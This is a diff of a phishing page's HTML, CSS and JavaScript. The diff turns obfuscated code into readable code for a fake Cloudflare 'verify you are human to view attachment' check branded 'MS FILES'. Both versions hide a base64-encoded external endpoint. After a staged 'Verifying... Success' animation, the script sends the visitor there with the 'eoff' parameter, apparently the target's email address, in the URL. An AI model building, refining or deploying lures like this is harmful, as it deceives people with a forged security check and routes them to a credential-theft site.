@@ -5,112 +5,287 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        :root { --x92: #4a6ee0; --y31: #28a745; --z88: #f8f9fa; --t12: 450ms cubic-bezier(0.4, 0, 0.2, 1); }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: system-ui, sans-serif; background: #fff; height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; }
-        #_l0_ { position: fixed; inset: 0; background: var(--z88); display: flex; justify-content: center; align-items: center; z-index: 99999; transition: opacity var(--t12); }
-        ._lb_ { width: 120px; animation: _p_ 1.5s ease-in-out infinite; }
-        @keyframes _p_ { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.08); opacity: 1; } }
-        ._cc_ { flex: 1; display: flex; flex-direction: column; justify-content: center; width: 100%; max-width: 440px; padding: 20px; opacity: 0; transform: translateY(10px); transition: all 600ms ease-out; }
-        ._cc_._v_ { opacity: 1; transform: translateY(0); }
-        ._h_ { text-align: center; font-size: 1.1rem; font-weight: 500; margin-bottom: 24px; line-height: 1.4; }
-        ._vc_ { background: var(--z88); border: 1px solid #ddd; border-radius: 10px; padding: 30px 20px; display: flex; justify-content: space-between; align-items: center; }
-        ._cg_ { display: flex; align-items: center; gap: 15px; }
-        ._bx_ { width: 20px; height: 20px; border: 2px solid var(--x92); border-radius: 4px; background: #fff; cursor: pointer; position: relative; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; }
-        ._bx_._ld_ { border-radius: 50%; border-color: #eee; border-top-color: var(--x92); animation: _s_ 1s linear infinite; }
-        ._bx_._cp_ { background: var(--y31); border-color: var(--y31); }
-        ._bx_._cp_::after { content: "\2713"; color: #fff; font-size: 14px; font-weight: bold; }
-        @keyframes _s_ { to { transform: rotate(360deg); } }
-        ._bi_ { text-align: right; font-size: 11px; color: #777; }
-        ._bi_ img { width: 28px; vertical-align: middle; margin-right: 5px; }
-        ._bi_ b { color: #f38020; letter-spacing: 0.5px; }
-        ._sm_ { text-align: center; margin-top: 25px; font-size: 12px; opacity: 0; transition: opacity 0.5s; }
-        ._fs_ { padding: 30px; color: #999; font-size: 12px; display: flex; align-items: center; gap: 8px; opacity: 0; transition: opacity 0.5s; }
-        ._fs_._v_ { opacity: 1; }
-        ._ss_ { width: 12px; height: 14px; background: #999; clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%); }
+        :root {
+            --primary-blue: #4a6ee0;
+            --success-green: #28a745;
+            --light-bg: #f8f9fa;
+            --transition-speed: 450ms cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Loading Overlay */
+        #preloader {
+            position: fixed;
+            inset: 0;
+            background: var(--light-bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            transition: opacity var(--transition-speed);
+        }
+
+        .loader-logo {
+            width: 120px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.08); opacity: 1; }
+        }
+
+        /* Main Content */
+        .app-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 600ms ease-out, transform 600ms ease-out;
+        }
+
+        .app-container.is-visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .instruction-text {
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 500;
+            margin-bottom: 24px;
+            line-height: 1.4;
+            color: #333;
+        }
+
+        .verification-card {
+            background: var(--light-bg);
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 30px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .checkbox-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .custom-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid var(--primary-blue);
+            border-radius: 4px;
+            background: #fff;
+            cursor: pointer;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.25s ease;
+        }
+
+        .custom-checkbox.loading {
+            border-radius: 50%;
+            border-color: #eee;
+            border-top-color: var(--primary-blue);
+            animation: spin 1s linear infinite;
+        }
+
+        .custom-checkbox.checked {
+            background: var(--success-green);
+            border-color: var(--success-green);
+        }
+
+        .custom-checkbox.checked::after {
+            content: "\2713";
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .brand-info {
+            text-align: right;
+            font-size: 11px;
+            color: #777;
+        }
+
+        .brand-info img {
+            width: 28px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        .brand-info b {
+            color: #f38020;
+            letter-spacing: 0.5px;
+        }
+
+        .status-message {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            height: 14px;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        /* Footer */
+        .footer-banner {
+            padding: 30px;
+            color: #999;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .footer-banner.is-visible { opacity: 1; }
+
+        .shield-icon {
+            width: 12px;
+            height: 14px;
+            background: #999;
+            clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%);
+        }
     </style>
 </head>
 <body>
 
-    <div id="_l0_"><img src="astro.png" class="_lb_"></div>
+    <div id="preloader">
+        <img src="cloudflare_.png" alt="Loading" class="loader-logo">
+    </div>
 
-    <main class="_cc_" id="_m1_">
-        <h1 class="_h_">Verify you are human by completing the action below to view attachment</h1>
-        <div class="_vc_">
-            <div class="_cg_">
-                <div id="_aX_" class="_bx_"></div>
-                <span id="_sL_" style="font-weight: 500; font-size: 16px;">Verify</span>
+    <main class="app-container" id="mainWrapper">
+        <h1 class="instruction-text">Verify you are human by completing the action below to view attachment</h1>
+
+        <div class="verification-card">
+            <div class="checkbox-section">
+                <div id="actionBox" class="custom-checkbox"></div>
+                <span id="actionText" style="font-weight: 500; font-size: 16px;">Verify</span>
             </div>
-            <div class="_bi_">
-                <div><img src="cloudflare_.png"><b>CLOUDFLARE</b></div>
+
+            <div class="brand-info">
+                <div><img src="cloudflare_.png" alt=""><b>CLOUDFLARE</b></div>
                 <span>Privacy &middot; Terms</span>
             </div>
         </div>
-        <div id="_sN_" class="_sm_"></div>
+
+        <div id="notificationArea" class="status-message"></div>
     </main>
 
-    <footer class="_fs_" id="_fL_">
-        <div class="_ss_"></div>
+    <footer class="footer-banner" id="footerInfo">
+        <div class="shield-icon"></div>
         <span>Protected by CLOUDFLARE</span>
     </footer>
 
     <script>
-        (function(_0x1, _0x2) {
-            const _0x3 = {
-                _u: "aHR0cHM6Ly9wby50aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=",
-                _d: [1500, 1800, 2000],
-                _k: ["opacity", "style", "display", "classList", "add", "remove", "textContent"]
+        (function() {
+            "use strict";
+
+            // Configuration
+            const CONFIG = {
+                endpoint: "aHR0cHM6Ly9wby50aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=",
+                delays: {
+                    initial: 1500,
+                    verify: 1800,
+                    redirect: 2000
+                }
             };
 
-            const _q = (s) => document.getElementById(s);
-            const _obs = {
-                l: _q('_l0_'),
-                m: _q('_m1_'),
-                a: _q('_aX_'),
-                s: _q('_sL_'),
-                f: _q('_fL_'),
-                n: _q('_sN_')
+            // DOM Elements
+            const elements = {
+                loader: document.getElementById('preloader'),
+                main: document.getElementById('mainWrapper'),
+                box: document.getElementById('actionBox'),
+                label: document.getElementById('actionText'),
+                footer: document.getElementById('footerInfo'),
+                status: document.getElementById('notificationArea')
             };
 
-            let _v = !1;
+            let isProcessing = false;
 
-            const _init = () => {
-                const _p = new URLSearchParams(window.location.search);
-                const _e = _p.get('eoff');
-
+            /**
+             * Handles page entry animations
+             */
+            const initApp = () => {
                 window.addEventListener('load', () => {
                     setTimeout(() => {
-                        _obs.l[_0x3._k[1]][_0x3._k[0]] = '0';
+                        elements.loader.style.opacity = '0';
+
                         setTimeout(() => {
-                            _obs.l[_0x3._k[1]][_0x3._k[2]] = 'none';
-                            _obs.m[_0x3._k[3]][_0x3._k[4]]('_v_');
-                            _obs.f[_0x3._k[3]][_0x3._k[4]]('_v_');
+                            elements.loader.style.display = 'none';
+                            elements.main.classList.add('is-visible');
+                            elements.footer.classList.add('is-visible');
                         }, 500);
-                    }, _0x3._d[0]);
+                    }, CONFIG.delays.initial);
                 });
-
-                _obs.a.onclick = () => {
-                    if (_v) return;
-                    _v = !!1;
-
-                    _obs.s[_0x3._k[6]] = "Verifying...";
-                    _obs.a[_0x3._k[3]][_0x3._k[4]]('_ld_');
-
-                    setTimeout(() => {
-                        _obs.a[_0x3._k[3]][_0x3._k[5]]('_ld_');
-                        _obs.a[_0x3._k[3]][_0x3._k[4]]('_cp_');
-                        _obs.s[_0x3._k[6]] = "Success";
-                        _obs.n[_0x3._k[1]][_0x3._k[0]] = '1';
-
-                        setTimeout(() => {
-                            const _target = atob(_0x3._u);
-                            location.href = _e ? `${_target}#${_e}` : _target;
-                        }, _0x3._d[2]);
-                    }, _0x3._d[1]);
-                };
             };
 
-            _init();
+            /**
+             * Handles the verification click logic
+             */
+            const handleVerification = async () => {
+                if (isProcessing) return;
+                isProcessing = true;
+
+                // Update UI to loading state
+                elements.label.textContent = "Verifying...";
+                elements.box.classList.add('loading');
+
+                // Simulate network/verification delay
+                await new Promise(resolve => setTimeout(resolve, CONFIG.delays.verify));
+
+                // Update UI to success state
+                elements.box.classList.remove('loading');
+                elements.box.classList.add('checked');
+                elements.label.textContent = "Success";
+                elements.status.style.opacity = '1';
+
+                // Final redirect
+                setTimeout(() => {
+                    const params = new URLSearchParams(window.location.search);
+                    const eoff = params.get('eoff');
+                    const destination = atob(CONFIG.endpoint);
+
+                    window.location.href = eoff ? `${destination}#${eoff}` : destination;
+                }, CONFIG.delays.redirect);
+            };
+
+            // Event Listeners
+            elements.box.addEventListener('click', handleVerification);
+
+            // Startup
+            initApp();
         })();
     </script>
 </body>
